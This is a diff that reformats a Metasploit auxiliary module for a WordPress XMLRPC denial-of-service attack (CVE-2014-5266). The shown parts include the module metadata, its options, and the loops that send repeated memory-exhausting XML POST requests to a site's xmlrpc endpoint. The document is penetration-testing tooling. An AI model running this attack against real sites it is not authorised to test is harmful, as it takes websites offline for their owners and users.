@@ -8,21 +8,21 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'          => 'Wordpress XMLRPC DoS',
-      'Description'   => %q{
-        Wordpress XMLRPC parsing is vulnerable to a XML based denial of service.
-        This vulnerability affects Wordpress 3.5 - 3.9.2 (3.8.4 and 3.7.4 are
-        also patched).
-      },
-      'Author'        =>
-        [
-          'Nir Goldshlager',    # advisory
+    super(
+      update_info(
+        info,
+        'Name' => 'Wordpress XMLRPC DoS',
+        'Description' => %q{
+          Wordpress XMLRPC parsing is vulnerable to a XML based denial of service.
+          This vulnerability affects Wordpress 3.5 - 3.9.2 (3.8.4 and 3.7.4 are
+          also patched).
+        },
+        'Author' => [
+          'Nir Goldshlager', # advisory
           'Christian Mehlmauer' # metasploit module
         ],
-      'License'       => MSF_LICENSE,
-      'References'    =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['CVE', '2014-5266'],
           ['URL', 'http://wordpress.org/news/2014/08/wordpress-3-9-2/'],
           ['URL', 'http://www.breaksec.com/?p=6362'],
@@ -30,19 +30,22 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://core.trac.wordpress.org/changeset/29404'],
           ['WPVDB', '7526']
         ],
-      'DisclosureDate'=> '2014-08-06'
-    ))
+        'DisclosureDate' => '2014-08-06'
+      )
+    )
 
     register_options(
-    [
-      OptInt.new('RLIMIT', [ true, "Number of requests to send", 1000 ])
-    ])
+      [
+        OptInt.new('RLIMIT', [ true, "Number of requests to send", 1000 ])
+      ]
+    )
 
     register_advanced_options(
-    [
-      OptInt.new('FINGERPRINT_STEP', [true, "The stepsize in MB when fingerprinting", 8]),
-      OptInt.new('DEFAULT_LIMIT', [true, "The default limit in MB", 8])
-    ])
+      [
+        OptInt.new('FINGERPRINT_STEP', [true, "The stepsize in MB when fingerprinting", 8]),
+        OptInt.new('DEFAULT_LIMIT', [true, "The default limit in MB", 8])
+      ]
+    )
   end
 
   def rlimit
@@ -64,10 +67,10 @@ class MetasploitModule < Msf::Auxiliary
     while memory_to_use < 1024
       vprint_status("trying memory limit #{memory_to_use}MB")
       opts = {
-        'method'  => 'POST',
-        'uri'     => wordpress_url_xmlrpc,
-        'data'    => generate_xml(memory_to_use),
-        'ctype'   =>'text/xml'
+        'method' => 'POST',
+        'uri' => wordpress_url_xmlrpc,
+        'data' => generate_xml(memory_to_use),
+        'ctype' => 'text/xml'
       }
 
       begin
@@ -156,10 +159,10 @@ class MetasploitModule < Msf::Auxiliary
     for x in 1..rlimit
       print_status("sending request ##{x}...")
       opts = {
-        'method'  => 'POST',
-        'uri'     => wordpress_url_xmlrpc,
-        'data'    => xml,
-        'ctype'   =>'text/xml'
+        'method' => 'POST',
+        'uri' => wordpress_url_xmlrpc,
+        'data' => xml,
+        'ctype' => 'text/xml'
       }
       begin
         c = connect
